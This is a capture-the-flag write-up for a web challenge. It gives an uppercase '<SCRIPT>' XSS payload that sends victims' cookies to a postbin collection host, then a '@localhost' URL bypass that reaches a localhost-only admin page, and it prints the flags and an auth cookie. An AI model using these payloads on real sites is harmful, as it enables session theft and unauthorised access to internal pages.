For the first flag you have to use XSS.

Words like 'script' and 'alert' are filtered, but 'SCRIPT' works.

As such, you can do something like this to steal the other person cookies:

<SCRIPT>new Image().src="link to postbin"+document.cookie</SCRIPT>

You will get 2 connections, 1 is yours and the other has the flag.

**First flag**
CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}


Along with the flag, you get the following cookie value for auth: TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz

If you create a cookie named 'auth' with that value, you can access Admin page.

'Users' and 'Livestreams' have nothing in it, but 'Camera Controls' seems to have something. The problem is it is only accessible from localhost.

In the first page we find that the video is presented through the path '/watch?livestream=...', so we may try to use this for a Local File Inclusion attack.

However, it only accepts files that begin with 'https://cwo-xss.web.ctfcompetition.com'.

As a bypass, we can include the file like this 'https://cwo-xss.web.ctfcompetition.com@localhost/admin/controls'.

Acessing the URL gives the flag.

https://cwo-xss.web.ctfcompetition.com/watch?livestream=https://cwo-xss.web.ctfcompetition.com@localhost/admin/controls

**Second flag**
CTF{WhatIsThisCookieFriendSpaceBookPlusAllAccessRedPremiumThingLooksYummy}